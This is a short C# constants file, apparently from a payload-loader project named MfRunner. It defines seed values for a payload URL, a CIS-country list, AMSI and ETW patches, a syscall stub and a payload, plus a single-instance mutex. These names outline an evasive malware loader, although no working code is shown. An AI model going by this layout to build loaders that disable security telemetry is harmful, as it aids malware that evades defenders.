namespace MfRunner
{
    internal partial class Program
    {
        public static byte[] DERIVE_KEY_STARTING_STATE = new byte[] { 0x00 };
        
        public static byte   SEED_PAYLOAD_URL                   = 0x01;
        public static byte   SEED_CIS_COUNTRIES_LIST            = 0x02;
        public static byte   SEED_AMSI_PATCH                    = 0x03;
        public static byte   SEED_ETW_PATCH                     = 0x04;
        public static byte   SEED_SYSCALL_STUB                  = 0x05;
        public static byte   SEED_PAYLOAD                       = 0x06;
        
#if SINGLE_INSTANCE
        public static string SINGLE_INSTANCE_MUTEX = "Global\\RANDOM_MUTEX";
#endif
    }
}
